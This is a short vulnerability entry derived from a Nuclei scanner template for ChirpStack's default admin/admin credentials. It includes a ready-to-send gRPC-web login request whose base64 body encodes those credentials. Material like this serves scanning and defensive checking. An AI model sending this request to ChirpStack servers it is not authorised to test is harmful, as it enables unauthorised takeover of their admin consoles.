# Nuclei Template: ChirpStack - Default Login
**Template ID:** chirpstack-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**CWE:** CWE-1392
**Source:** Nuclei Template (`chirpstack-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Fresh ChirpStack installations use the default credentials (admin/admin), allowing attackers to easily access the admin console.

## Steps to reproduce / Exploit Payload
```http
POST /api.InternalService/Login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/grpc-web-text
Accept: application/grpc-web-text

AAAAAA4KBWFkbWluEgVhZG1pbg==
```

## References
- https://www.chirpstack.io/docs/chirpstack/use/login.html
